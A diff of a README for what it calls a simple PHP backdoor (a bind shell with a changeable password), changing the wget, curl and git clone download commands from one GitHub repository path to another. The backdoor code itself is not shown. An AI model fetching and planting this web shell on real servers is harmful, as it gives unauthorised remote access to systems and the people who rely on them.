@@ -5,13 +5,13 @@ This is a simple backdoor written in PHP, you can change the value of the $PASSW
  
 # Download :
 ```bash
-wget https://raw.githubusercontent.com/NullBrunk/PhpBindShell/main/PhpBindShell.php  
+wget https://raw.githubusercontent.com/NullBrunk/WebShell/main/PhpBindShell.php  
 ```
 ```bash
-curl -so PhpBindShell.php https://raw.githubusercontent.com/NullBrunk/PhpBindShell/main/PhpBindShell.php 
+curl -so PhpBindShell.php https://raw.githubusercontent.com/NullBrunk/WebShell/main/PhpBindShell.php 
 ```
 ```bash
-git clone https://github.com/NullBrunk/PhpBindShell.git && mv PhpBindShell/PhpBindShell.php ./ && rm -rf PhpBindShell
+git clone https://github.com/NullBrunk/WebShell.git && mv WebShell/PhpBindShell.php ./ && rm -rf WebShell/
 ```
 
 # Result
